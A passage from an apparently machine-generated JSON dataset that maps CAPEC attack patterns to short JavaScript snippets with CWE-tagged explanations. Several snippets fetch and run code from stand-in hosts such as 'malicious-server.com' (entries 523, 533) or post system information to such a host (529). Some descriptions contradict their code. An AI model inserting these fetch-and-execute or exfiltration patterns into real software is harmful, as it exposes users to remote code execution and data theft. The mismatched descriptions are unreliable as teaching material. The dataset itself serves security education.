        "description": "This JavaScript code snippet demonstrates the concept of 'Physical Theft' by simulating a scenario where sensitive information is stored in a file without proper access control mechanisms. The code writes sensitive data (e.g., user credentials) to a file named 'sensitiveData.txt' and provides a function to read this data. The lack of access control means that anyone with physical access to the system can read the sensitive information. This embodies the CAPEC idea of physical theft and highlights related CWEs such as 'Improper Physical Access Control' (CWE-1263), 'Insecure Storage of Sensitive Information' (CWE-922), and 'Storage of Sensitive Data in a Mechanism without Access Control' (CWE-921)."
    },
    {
        "capec_id": "508",
        "capec_name": "Shoulder Surfing",
        "code_snippet": "document.getElementById('passwordInput').addEventListener('input', function() {\n  var password = this.value;\n  console.log('User password: ' + password); // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n});\n\n// Simulating cleartext transmission of sensitive information (CWE-319)\nfunction sendPassword() {\n  var password = document.getElementById('passwordInput').value;\n  var xhr = new XMLHttpRequest();\n  xhr.open('POST', 'http://example.com/login', true);\n  xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');\n  xhr.send('password=' + password); // CWE-319: Cleartext Transmission of Sensitive Information\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information, such as a user's password, is exposed to potential shoulder surfing attacks. The code logs the user's password to the console (CWE-200), which can be easily observed by an unauthorized actor. Additionally, the password is transmitted in cleartext over an HTTP connection (CWE-319), making it vulnerable to interception. This snippet highlights the risks associated with improper handling and transmission of sensitive information, aligning with the concept of shoulder surfing attacks."
    },
    {
        "capec_id": "509",
        "capec_name": "Kerberoasting",
        "code_snippet": "const crypto = require('crypto');\nconst fs = require('fs');\n\n// Simulate obtaining a service ticket encrypted with RC4\nfunction getServiceTicket() {\n  const ticket = 'fakeEncryptedTicket'; // Placeholder for an actual service ticket\n  return ticket;\n}\n\n// Simulate saving the ticket to disk\nfunction saveTicketToDisk(ticket) {\n  fs.writeFileSync('ticket.enc', ticket);\n}\n\n// Simulate brute-forcing the hashed value\nfunction bruteForceTicket(ticket) {\n  const possibleKeys = ['weakpassword1', 'password123', 'admin']; // Weak passwords\n  for (const key of possibleKeys) {\n    const decipher = crypto.createDecipher('rc4', key);\n    let decrypted;\n    try {\n      decrypted = decipher.update(ticket, 'hex', 'utf8');\n      decrypted += decipher.final('utf8');\n      console.log(`Decrypted with key: ${key}`);\n      return decrypted;\n    } catch (err) {\n      // Continue trying other keys\n    }\n  }\n  return null;\n}\n\nconst ticket = getServiceTicket();\nsaveTicketToDisk(ticket);\nconst crackedCredentials = bruteForceTicket(ticket);\nif (crackedCredentials) {\n  console.log('Cracked credentials:', crackedCredentials);\n} else {\n  console.log('Failed to crack credentials');\n}",
        "description": "This JavaScript code snippet simulates the Kerberoasting attack described in the CAPEC. It demonstrates how an attacker might obtain a service ticket, save it to disk, and then attempt to brute-force the ticket using weak passwords. The code highlights several related CWEs: the use of weak passwords (CWE-521), insufficiently protected credentials (CWE-522), and the use of single-factor authentication (CWE-308). The `getServiceTicket` function simulates obtaining a service ticket, `saveTicketToDisk` saves the ticket to disk, and `bruteForceTicket` attempts to decrypt the ticket using a list of weak passwords. This illustrates the vulnerability of using weak passwords and insufficiently protected credentials in authentication mechanisms."
    },
    {
        "capec_id": "510",
        "capec_name": "SaaS User Request Forgery",
        "code_snippet": "const maliciousApp = () => {\n  const trustedUserSession = getSessionFromTrustedUser(); // CWE-346: Origin Validation Error\n  const targetSaaSUrl = 'https://target-saas.com/api/performAction';\n  const maliciousPayload = { action: 'delete', resource: 'importantData' };\n\n  fetch(targetSaaSUrl, {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Authorization': `Bearer ${trustedUserSession.token}` // CWE-863, CWE-285: Incorrect/Improper Authorization\n    },\n    body: JSON.stringify(maliciousPayload)\n  })\n  .then(response => response.json())\n  .then(data => console.log('Action performed:', data))\n  .catch(error => console.error('Error:', error));\n};\n\n// Simulate the execution of the malicious app\nmaliciousApp();",
        "description": "This JavaScript code snippet demonstrates a SaaS User Request Forgery attack. The `maliciousApp` function simulates a malicious application that leverages a trusted user's session to perform unauthorized actions on a third-party SaaS application. The function retrieves the session token of a trusted user (CWE-346: Origin Validation Error) and uses it to send a malicious request to the SaaS application's API endpoint. The request includes an authorization header with the trusted user's token (CWE-863, CWE-285: Incorrect/Improper Authorization), allowing the malicious action to be executed with the trusted user's privileges. This code embodies the main idea of the CAPEC by showing how an attacker can exploit the implicit trust placed on an authenticated user's session to perform unauthorized actions on a cloud service."
    },
    {
        "capec_id": "511",
        "capec_name": "Infiltration of Software Development Environment",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-215: Insertion of Sensitive Information Into Debugging Code\nconst sensitiveInfo = 'API_KEY=12345';\nconsole.log(`Debug: Sensitive Info - ${sensitiveInfo}`);\n\n// CWE-434: Unrestricted Upload of File with Dangerous Type\nfunction uploadFile(file) {\n  const uploadPath = path.join(__dirname, 'uploads', file.name);\n  fs.writeFileSync(uploadPath, file.data);\n  console.log('File uploaded successfully');\n}\n\n// CWE-506: Embedded Malicious Code\nfunction executeMaliciousCode() {\n  console.log('Executing malicious code...');\n  // Malicious actions here\n}\n\n// CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nfunction getSystemInfo() {\n  return {\n    os: process.platform,\n    nodeVersion: process.version,\n    memoryUsage: process.memoryUsage()\n  };\n}\n\n// CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nfunction exposeSensitiveInfo() {\n  const systemInfo = getSystemInfo();\n  console.log(`System Info: ${JSON.stringify(systemInfo)}`);\n}\n\n// Simulate an attacker infiltrating the IDE and executing malicious code\nfunction infiltrateIDE() {\n  console.log('Infiltrating IDE...');\n  executeMaliciousCode();\n  exposeSensitiveInfo();\n}\n\n// Simulate file upload\nuploadFile({ name: 'malicious.exe', data: 'malicious content' });\n\n// Simulate IDE infiltration\ninfiltrateIDE();",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker infiltrates an IDE environment, leveraging several common weaknesses. The code includes: \n1. CWE-215: Sensitive information (an API key) is inserted into debugging code, which is logged to the console.\n2. CWE-434: A function to upload files without restriction on file types, allowing potentially dangerous files to be uploaded.\n3. CWE-506: A function that simulates the execution of malicious code.\n4. CWE-497: A function that retrieves and exposes sensitive system information.\n5. CWE-200: A function that logs sensitive system information to the console.\nThe `infiltrateIDE` function simulates an attacker gaining control of the IDE, executing malicious code, and exposing sensitive information. This represents the main idea of the CAPEC, where an attacker infiltrates a software development environment to implant malware and exfiltrate sensitive data."
    },
    {
        "capec_id": "516",
        "capec_name": "Hardware Component Substitution During Baselining",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate loading a third-party component\nfunction loadComponent(componentPath) {\n  if (!fs.existsSync(componentPath)) {\n    throw new Error('Component not found');\n  }\n  return require(componentPath);\n}\n\n// Simulate baseline development\nfunction baselineDevelopment() {\n  const baselineComponentPath = path.join(__dirname, 'baselineComponent.js');\n  const maliciousComponentPath = path.join(__dirname, 'maliciousComponent.js');\n\n  // Simulate substitution of a malicious component\n  if (Math.random() < 0.5) { // 50% chance to substitute\n    fs.copyFileSync(maliciousComponentPath, baselineComponentPath);\n  }\n\n  const component = loadComponent(baselineComponentPath);\n  component.initialize();\n}\n\nbaselineDevelopment();",
        "description": "This JavaScript code snippet simulates the substitution of a malicious hardware component during the baseline development phase, as described in the CAPEC. The `loadComponent` function attempts to load a component from a specified path, throwing an error if the component is not found. The `baselineDevelopment` function simulates the baseline development process, where there is a 50% chance that a malicious component will replace the baseline component. This represents the vulnerability of relying on third-party components (CWE-1395) and the risk of using components that are not sufficiently trustworthy (CWE-1357). The code highlights the potential for an adversary to introduce a malicious component during development, leading to compromised final products."
    },
    {
        "capec_id": "517",
        "capec_name": "Documentation Alteration to Circumvent Dial-down",
        "code_snippet": "const fs = require('fs');\n\n// CWE-1263: Improper Physical Access Control\nfunction alterDocumentation(filePath, newContent) {\n  if (!fs.existsSync(filePath)) {\n    console.error('File does not exist.');\n    return;\n  }\n\n  // CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n  const sensitiveInfo = 'Advanced Technology Details';\n  if (newContent.includes(sensitiveInfo)) {\n    console.error('Unauthorized alteration detected.');\n    return;\n  }\n\n  // CWE-1059: Insufficient Technical Documentation\n  const documentation = fs.readFileSync(filePath, 'utf8');\n  if (!documentation.includes('Critical Component Description')) {\n    console.error('Insufficient technical documentation.');\n    return;\n  }\n\n  // CWE-695: Use of Low-Level Functionality\n  fs.writeFileSync(filePath, newContent, { flag: 'w' });\n  console.log('Documentation altered successfully.');\n}\n\n// Example usage\nalterDocumentation('path/to/documentation.txt', 'New content with advanced technology details.');",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker alters a manufacturer's documentation to circumvent dial-down functionality requirements. The function `alterDocumentation` takes a file path and new content as arguments. It first checks if the file exists (CWE-1263: Improper Physical Access Control). It then checks if the new content includes sensitive information that should not be exposed (CWE-200: Exposure of Sensitive Information to an Unauthorized Actor). The function also verifies if the existing documentation contains sufficient technical details (CWE-1059: Insufficient Technical Documentation). Finally, it writes the new content to the file using low-level file system operations (CWE-695: Use of Low-Level Functionality). This code represents the main idea of the CAPEC by showing how an attacker could alter documentation to include advanced technology details that should be restricted."
    },
    {
        "capec_id": "518",
        "capec_name": "Documentation Alteration to Produce Under-performing Systems",
        "code_snippet": "/* Insufficient Technical Documentation and Missing Design Documentation */\n// This function is supposed to handle user authentication\n// However, due to lack of proper documentation, it contains flaws\n\nfunction authenticateUser(username, password) {\n    // Use of low-level functionality\n    var user = getUserFromDatabase(username); // This function is not documented\n    if (user && user.password === password) {\n        // Exposure of Sensitive System Information\n        console.log('User authenticated:', user); // Sensitive information exposed\n        return true;\n    }\n    return false;\n}\n\n// Improper Following of Specification by Caller\n// The caller does not follow the required protocol for password hashing\nvar isAuthenticated = authenticateUser('admin', 'password123');\nif (isAuthenticated) {\n    console.log('Access granted');\n} else {\n    console.log('Access denied');\n}",
        "description": "This JavaScript code snippet demonstrates a function intended for user authentication. The function `authenticateUser` lacks proper documentation, leading to several vulnerabilities. It uses a low-level function `getUserFromDatabase` without documentation, exposing sensitive user information through console logs. Additionally, the caller does not follow the required protocol for password hashing, leading to improper specification adherence. This code embodies the CAPEC idea of altering documentation to produce under-performing systems by showcasing how insufficient and missing documentation can lead to significant security flaws."
    },
    {
        "capec_id": "519",
        "capec_name": "Documentation Alteration to Cause Errors in System Design",
        "code_snippet": "class User {\n  constructor(name, role) {\n    this.name = name;\n    this.role = role;\n  }\n\n  getRole() {\n    return this.role;\n  }\n}\n\n// Documentation altered to suggest 'admin' role has full access\n// Original: 'admin' role should have restricted access\nconst user = new User('Alice', 'admin');\n\n// Incorrectly implemented function based on altered documentation\nfunction checkAccess(user) {\n  if (user.getRole() === 'admin') {\n    // Improper control of access based on role\n    console.log('Access granted to admin');\n  } else {\n    console.log('Access denied');\n  }\n}\n\ncheckAccess(user);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker has altered the documentation to suggest that the 'admin' role should have full access, whereas the original design intended for 'admin' to have restricted access. The `User` class and `checkAccess` function are implemented based on the altered documentation. The `checkAccess` function improperly grants full access to users with the 'admin' role, embodying the CAPEC of 'Documentation Alteration to Cause Errors in System Design'. This example also touches on related CWEs such as 'Insufficient Technical Documentation' (CWE-1059), 'Missing Documentation for Design' (CWE-1053), and 'Incorrect Provision of Specified Functionality' (CWE-684)."
    },
    {
        "capec_id": "520",
        "capec_name": "Counterfeit Hardware Component Inserted During Product Assembly",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.trusted = false;\n    this.maliciousCode = () => {\n      // Malicious behavior hidden in the component\n      console.log('Executing hidden malicious code');\n    };\n  }\n\n  performOperation() {\n    if (!this.trusted) {\n      this.maliciousCode();\n    } else {\n      console.log('Performing normal operation');\n    }\n  }\n}\n\n// Simulating the use of a counterfeit hardware component\nconst component = new HardwareComponent();\ncomponent.performOperation();",
        "description": "This JavaScript code snippet represents a counterfeit hardware component inserted during product assembly. The `HardwareComponent` class includes a `maliciousCode` method that simulates embedded malicious code (CWE-506). The `performOperation` method checks if the component is trusted; if not, it executes the malicious code. This demonstrates reliance on an insufficiently trustworthy component (CWE-1357) and the inclusion of undocumented features (CWE-1242). The counterfeit component behaves differently from a legitimate one, which could be observable (CWE-207)."
    },
    {
        "capec_id": "521",
        "capec_name": "Hardware Design Specifications Are Altered",
        "code_snippet": "const hardwareSpecs = {\n  registerDefaults: {\n    secureRegister: 0x00, // CWE-1221: Incorrect Register Defaults\n    debugMode: false // CWE-1296: Incorrect Chaining or Granularity of Debug Components\n  },\n  lockBit: false // CWE-1231: Improper Prevention of Lock Bit Modification\n};\n\n// CWE-1059: Insufficient Technical Documentation\n// Documentation is missing for the following hardware specifications\n// - secureRegister: Should be set to 0xFF for security\n// - debugMode: Should be true only for debugging purposes\n// - lockBit: Should be true to prevent unauthorized modifications\n\n// CWE-657: Violation of Secure Design Principles\n// The following function violates secure design principles by allowing modification of lockBit\nfunction modifyLockBit(newValue) {\n  hardwareSpecs.lockBit = newValue;\n}\n\n// Attacker alters the design specifications\nmodifyLockBit(true); // Lock bit is now modifiable, compromising security\nhardwareSpecs.registerDefaults.secureRegister = 0x00; // Insecure default value\nhardwareSpecs.registerDefaults.debugMode = true; // Debug mode enabled, increasing attack surface\n\nconsole.log(hardwareSpecs);",
        "description": "This JavaScript code snippet simulates a scenario where an attacker alters hardware design specifications, embodying the main idea of the CAPEC. The code defines a hardware specification object with insecure default values for registers (CWE-1221), incorrect debug mode settings (CWE-1296), and a modifiable lock bit (CWE-1231). The lack of sufficient technical documentation (CWE-1059) is indicated by comments, and the violation of secure design principles (CWE-657) is demonstrated by a function that allows modification of the lock bit. The attacker then modifies these specifications to introduce security flaws, representing the CAPEC's main idea of altering hardware design specifications to introduce vulnerabilities."
    },
    {
        "capec_id": "522",
        "capec_name": "Malicious Hardware Component Replacement",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.updateable = false; // CWE-1329: Component is not updateable\n    this.trustworthy = false; // CWE-1357: Insufficiently trustworthy component\n  }\n\n  performCriticalOperation() {\n    if (!this.trustworthy) {\n      console.error('Error: Untrusted hardware component detected!');\n      // CWE-1334: Injecting error to degrade system redundancy\n      this.injectError();\n    }\n    // CWE-506: Embedded malicious code\n    this.maliciousCode();\n  }\n\n  injectError() {\n    console.log('Injecting error to degrade system redundancy...');\n  }\n\n  maliciousCode() {\n    console.log('Executing malicious code...');\n  }\n}\n\n// Simulating the replacement of a legitimate hardware component with a malicious one\nconst compromisedComponent = new HardwareComponent();\ncompromisedComponent.performCriticalOperation();",
        "description": "This JavaScript code snippet simulates the replacement of a legitimate hardware component with a malicious one, embodying the main idea of CAPEC-452: 'Malicious Hardware Component Replacement'. The `HardwareComponent` class represents a hardware component that is not updateable (CWE-1329) and is insufficiently trustworthy (CWE-1357). The `performCriticalOperation` method checks if the component is trustworthy and, if not, injects an error (CWE-1334) and executes malicious code (CWE-506). This demonstrates how a compromised hardware component can disrupt system operations and introduce vulnerabilities."
    },
    {
        "capec_id": "523",
        "capec_name": "Malicious Software Implanted",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\n// CWE-1395: Dependency on Vulnerable Third-Party Component\nconst vulnerableComponent = require('vulnerable-component');\n\n// CWE-506: Embedded Malicious Code\nfunction maliciousFunction() {\n  // CWE-509: Replicating Malicious Code (Virus or Worm)\n  http.get('http://malicious-server.com/payload', (res) => {\n    let data = '';\n    res.on('data', (chunk) => { data += chunk; });\n    res.on('end', () => {\n      fs.writeFileSync('/tmp/malicious_payload.js', data);\n      require('/tmp/malicious_payload.js');\n    });\n  });\n}\n\n// CWE-1229: Creation of Emergent Resource\nfunction createEmergentResource() {\n  fs.writeFileSync('/tmp/emergent_resource.txt', 'This is an emergent resource.');\n}\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nfunction injectErrors() {\n  console.error('Injected error to degrade system redundancy');\n}\n\n// Main function to simulate the malicious software implantation\nfunction main() {\n  if (vulnerableComponent.isVulnerable()) {\n    maliciousFunction();\n    createEmergentResource();\n    injectErrors();\n  }\n}\n\nmain();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Malicious Software Implanted' in a system, as described in the CAPEC. The code includes several vulnerabilities and malicious actions: \n\n1. **CWE-1395: Dependency on Vulnerable Third-Party Component** - The code imports a hypothetical vulnerable third-party component.\n2. **CWE-506: Embedded Malicious Code** - The `maliciousFunction` function fetches and executes a malicious payload from a remote server.\n3. **CWE-509: Replicating Malicious Code (Virus or Worm)** - The malicious payload is designed to replicate and spread.\n4. **CWE-1229: Creation of Emergent Resource** - The `createEmergentResource` function creates a new resource that could be exploited by attackers.\n5. **CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy** - The `injectErrors` function simulates error injection to degrade system redundancy.\n\nThe `main` function checks if the vulnerable component is indeed vulnerable and then executes the malicious functions, simulating the implantation of malicious software in a system."
    },
    {
        "capec_id": "524",
        "capec_name": "Rogue Integration Procedures",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nconst maliciousLibrary = require('/untrusted/path/maliciousLibrary');\n\n// Function to simulate the integration of a malicious component\nfunction integrateComponent(componentPath) {\n  try {\n    // CWE-506: Embedded Malicious Code\n    const component = fs.readFileSync(componentPath, 'utf8');\n    // CWE-707: Improper Neutralization\n    if (component.includes('<script>')) {\n      throw new Error('Malicious script detected');\n    }\n    // Integrate the component (potentially malicious)\n    console.log('Component integrated:', component);\n  } catch (error) {\n    console.error('Integration failed:', error.message);\n  }\n}\n\n// Simulate the integration process with a potentially malicious component\nintegrateComponent(path.join(__dirname, 'components', 'maliciousComponent.js'));\n\n// CWE-1334: Unauthorized Error Injection Can Degrade Hardware Redundancy\nfunction degradeRedundancy() {\n  console.log('Injecting errors to degrade redundancy...');\n  // Simulate error injection\n  for (let i = 0; i < 5; i++) {\n    console.error('Error injected:', i);\n  }\n}\n\ndegradeRedundancy();",
        "description": "This JavaScript code snippet demonstrates the concept of 'Rogue Integration Procedures' by simulating the integration of a potentially malicious component into a system. The code includes several vulnerabilities: CWE-829 by requiring a library from an untrusted path, CWE-506 by reading and potentially integrating a malicious component, CWE-707 by not properly neutralizing special elements in the component, and CWE-1334 by simulating error injection to degrade system redundancy. The code highlights how an attacker could alter or establish rogue processes to insert malicious components, leading to system compromise or disruption."
    },
    {
        "capec_id": "528",
        "capec_name": "XML Flood",
        "code_snippet": "const http = require('http');\nconst xml2js = require('xml2js');\n\nconst server = http.createServer((req, res) => {\n  let body = '';\n  req.on('data', chunk => {\n    body += chunk.toString();\n  });\n\n  req.on('end', () => {\n    xml2js.parseString(body, (err, result) => {\n      if (err) {\n        res.writeHead(400, {'Content-Type': 'text/plain'});\n        res.end('Invalid XML');\n        return;\n      }\n      // Process the XML data\n      res.writeHead(200, {'Content-Type': 'text/plain'});\n      res.end('XML received');\n    });\n  });\n});\n\nserver.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet creates an HTTP server using Node.js that listens for incoming requests. When a request is received, it collects the body of the request and attempts to parse it as XML using the 'xml2js' library. If the XML is invalid, it responds with a 400 status code and an 'Invalid XML' message. Otherwise, it processes the XML data and responds with a 200 status code and an 'XML received' message.\n\nThis code is vulnerable to an XML Flood attack (CAPEC-230) because it does not impose any limits on the size or number of XML requests it can handle (CWE-770). Additionally, it does not validate the XML against a schema (CWE-112), making it susceptible to malformed or malicious XML. The lack of proper XML validation and resource allocation controls can lead to a Denial of Service (DoS) condition, where the server becomes overwhelmed and unable to process legitimate requests."
    },
    {
        "capec_id": "529",
        "capec_name": "Malware-Directed Internal Reconnaissance",
        "code_snippet": "const http = require('http');\nconst os = require('os');\nconst fs = require('fs');\n\n// Function to gather system information\nfunction gatherSystemInfo() {\n  const systemInfo = {\n    hostname: os.hostname(),\n    platform: os.platform(),\n    arch: os.arch(),\n    cpus: os.cpus(),\n    networkInterfaces: os.networkInterfaces()\n  };\n  return systemInfo;\n}\n\n// Function to send gathered information to an external server\nfunction sendInfoToServer(info) {\n  const options = {\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/collect-info',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (chunk) => {\n      console.log(`BODY: ${chunk}`);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(`Problem with request: ${e.message}`);\n  });\n\n  req.write(JSON.stringify(info));\n  req.end();\n}\n\n// Main function to execute the malicious behavior\nfunction main() {\n  const info = gatherSystemInfo();\n  sendInfoToServer(info);\n}\n\n// Execute the main function\nmain();",
        "description": "This JavaScript code snippet demonstrates a malware-directed internal reconnaissance attack. The code gathers sensitive system information such as hostname, platform, architecture, CPU details, and network interfaces using the 'os' module. It then sends this information to an external server ('malicious-server.com') using an HTTP POST request. This embodies the CAPEC concept of using malware to gather information about a targeted system. The code also reflects related CWEs: it exposes sensitive system information (CWE-497), contains potentially malicious code (CWE-506), and could be part of a larger spyware or virus (CWE-512, CWE-509)."
    },
    {
        "capec_id": "530",
        "capec_name": "Provide Counterfeit Component",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Simulate a third-party component that is counterfeit\nconst counterfeitComponentPath = path.join(__dirname, 'counterfeitComponent.js');\n\n// Function to load and execute the counterfeit component\nfunction loadCounterfeitComponent() {\n  if (fs.existsSync(counterfeitComponentPath)) {\n    const counterfeitComponent = require(counterfeitComponentPath);\n    counterfeitComponent.execute();\n  } else {\n    console.error('Component not found');\n  }\n}\n\n// Simulate the main application loading the counterfeit component\nloadCounterfeitComponent();",
        "description": "This JavaScript code snippet simulates the inclusion of a counterfeit third-party component into a main application. The `loadCounterfeitComponent` function checks for the existence of a file named 'counterfeitComponent.js' and, if found, loads and executes it. This represents the CAPEC scenario where an attacker provides a counterfeit component during the procurement process. The related CWEs are illustrated by the dependency on a potentially vulnerable or malicious third-party component (CWE-1395, CWE-506), reliance on an insufficiently trustworthy component (CWE-1357), and the potential for observable discrepancies in behavior (CWE-207)."
    },
    {
        "capec_id": "531",
        "capec_name": "Hardware Component Substitution",
        "code_snippet": "class HardwareComponent {\n  constructor(name, version) {\n    this.name = name;\n    this.version = version;\n    this.isMalicious = false;\n  }\n\n  updateFirmware(newVersion) {\n    if (this.isMalicious) {\n      console.log('Malicious component detected! Update aborted.');\n      return;\n    }\n    this.version = newVersion;\n    console.log(`Firmware updated to version ${newVersion}`);\n  }\n\n  injectMaliciousCode() {\n    this.isMalicious = true;\n    console.log('Malicious code injected!');\n  }\n}\n\n// Simulate hardware component substitution\nlet originalComponent = new HardwareComponent('ComponentA', '1.0');\nlet maliciousComponent = new HardwareComponent('ComponentA', '1.0');\nmaliciousComponent.injectMaliciousCode();\n\n// Attempt to update firmware on the malicious component\nmaliciousComponent.updateFirmware('2.0');",
        "description": "This JavaScript code snippet simulates a hardware component substitution attack. The `HardwareComponent` class represents a hardware component with a name and version. The `updateFirmware` method attempts to update the firmware version but checks if the component is malicious before proceeding. The `injectMaliciousCode` method marks the component as malicious. The code then demonstrates substituting an original component with a malicious one and attempting to update its firmware, which is aborted due to the malicious nature of the component. This embodies the CAPEC idea of substituting a tested and approved hardware component with a maliciously-altered one, and it also touches on related CWEs such as reliance on non-updateable components, improper restriction of software interfaces, and embedded malicious code."
    },
    {
        "capec_id": "532",
        "capec_name": "Altered Installed BIOS",
        "code_snippet": "const fs = require('fs');\n\n// Simulate downloading a malicious BIOS update\nfunction downloadMaliciousBIOS() {\n  return 'malicious_bios.bin';\n}\n\n// Simulate updating the BIOS with the malicious file\nfunction updateBIOS(biosFile) {\n  if (!isFirmwareUpdateable()) {\n    console.log('Firmware is not updateable.');\n    return;\n  }\n  if (!hasGranularAccessControl()) {\n    console.log('Insufficient granularity of access control.');\n    return;\n  }\n  if (isLockBitModifiable()) {\n    console.log('Lock bit can be modified.');\n    return;\n  }\n  fs.writeFileSync('/path/to/bios', biosFile);\n  console.log('BIOS updated with malicious code.');\n}\n\n// Check if the firmware is updateable\nfunction isFirmwareUpdateable() {\n  // Simulate a check for firmware update capability\n  return false; // CWE-1277: Firmware Not Updateable\n}\n\n// Check for granular access control\nfunction hasGranularAccessControl() {\n  // Simulate a check for access control granularity\n  return false; // CWE-1220: Insufficient Granularity of Access Control\n}\n\n// Check if the lock bit can be modified\nfunction isLockBitModifiable() {\n  // Simulate a check for lock bit modification\n  return true; // CWE-1231: Improper Prevention of Lock Bit Modification\n}\n\nconst maliciousBIOS = downloadMaliciousBIOS();\nupdateBIOS(maliciousBIOS);",
        "description": "This JavaScript code snippet simulates the process of downloading and updating a BIOS with a malicious file, embodying the main idea of the CAPEC 'Altered Installed BIOS'. The code checks for several vulnerabilities related to the CWEs provided: it verifies if the firmware is updateable (CWE-1277), if there is sufficient granularity in access control (CWE-1220), and if the lock bit can be modified (CWE-1231). If any of these checks fail, it logs the corresponding issue and prevents the BIOS update. Otherwise, it proceeds to write the malicious BIOS file, simulating an attack scenario where the BIOS is compromised, allowing for future exploitation."
    },
    {
        "capec_id": "533",
        "capec_name": "Malicious Manual Software Update",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\n// CWE-494: Download of Code Without Integrity Check\nhttp.get('http://malicious-site.com/update.js', (res) => {\n  let data = '';\n  res.on('data', (chunk) => { data += chunk; });\n  res.on('end', () => {\n    // CWE-506: Embedded Malicious Code\n    fs.writeFile('update.js', data, (err) => {\n      if (err) throw err;\n      console.log('Update downloaded and saved.');\n      // Execute the downloaded script without verifying its integrity\n      require('./update.js');\n    });\n  });\n}).on('error', (err) => {\n  console.error('Error downloading update:', err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerable software update mechanism. It downloads a script from a remote location and executes it without verifying its integrity (CWE-494). The downloaded script could contain malicious code (CWE-506), which would then be executed on the victim's system. This embodies the main idea of the CAPEC 'Malicious Manual Software Update', where an attacker introduces malicious code through a software update. The code highlights the risk of downloading and executing code without proper security checks, potentially leading to system compromise."
    },
    {
        "capec_id": "534",
        "capec_name": "Malicious Hardware Update",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.firmwareVersion = '1.0.0';\n    this.isUpdateable = false; // CWE-1277: Firmware Not Updateable\n  }\n\n  updateFirmware(newFirmware) {\n    if (this.isUpdateable) {\n      this.firmwareVersion = newFirmware;\n    } else {\n      console.log('Firmware update not supported.');\n    }\n  }\n}\n\nclass MaliciousHardware extends HardwareComponent {\n  constructor() {\n    super();\n    this.firmwareVersion = '1.0.0-malicious'; // CWE-506: Embedded Malicious Code\n  }\n\n  performMaliciousAction() {\n    console.log('Performing malicious action!');\n    // Additional malicious behavior here\n  }\n}\n\n// Simulate hardware replacement\nlet currentHardware = new HardwareComponent();\nconsole.log('Current firmware version:', currentHardware.firmwareVersion);\n\n// Adversary replaces with malicious hardware\ncurrentHardware = new MaliciousHardware();\nconsole.log('Replaced with malicious hardware.');\nconsole.log('Current firmware version:', currentHardware.firmwareVersion);\n\n// Attempt to perform malicious action\ncurrentHardware.performMaliciousAction();",
        "description": "This JavaScript code snippet simulates a scenario where an adversary replaces a legitimate hardware component with a malicious one during an update or replacement procedure. The `HardwareComponent` class represents a typical hardware component with non-updateable firmware (CWE-1277). The `MaliciousHardware` class extends `HardwareComponent` and introduces malicious firmware (CWE-506). The code demonstrates the replacement of a legitimate hardware component with a malicious one, highlighting the potential for embedded malicious code and the inability to update the firmware to mitigate the threat. This embodies the main idea of CAPEC-460: Malicious Hardware Update."
    },
    {
        "capec_id": "535",
        "capec_name": "Malicious Gray Market Hardware",
        "code_snippet": "class HardwareComponent {\n  constructor() {\n    this.firmware = 'v1.0'; // CWE-1329: Non-updateable firmware\n    this.trusted = false; // CWE-1357: Insufficiently trustworthy component\n  }\n\n  execute() {\n    if (!this.trusted) {\n      this.maliciousCode(); // CWE-506: Embedded malicious code\n    }\n  }\n\n  maliciousCode() {\n    console.log('Executing malicious code...');\n    // CWE-1297: Accessing unprotected confidential information\n    let confidentialData = this.accessConfidentialData();\n    console.log('Confidential Data:', confidentialData);\n  }\n\n  accessConfidentialData() {\n    return 'Sensitive Information';\n  }\n}\n\n// Simulating the use of a vulnerable third-party component (CWE-1395)\nlet component = new HardwareComponent();\ncomponent.execute();",
        "description": "This JavaScript code snippet represents a malicious hardware component that embodies the main idea of the CAPEC 'Malicious Gray Market Hardware'. The class `HardwareComponent` has a non-updateable firmware (CWE-1329) and is marked as untrusted (CWE-1357). When the `execute` method is called, it checks if the component is trusted. If not, it runs a method containing malicious code (CWE-506) that accesses and logs confidential information (CWE-1297). The snippet also simulates the use of a vulnerable third-party component (CWE-1395) by creating an instance of `HardwareComponent` and calling its `execute` method."
    },
    {
        "capec_id": "536",
        "capec_name": "Data Injected During Configuration",
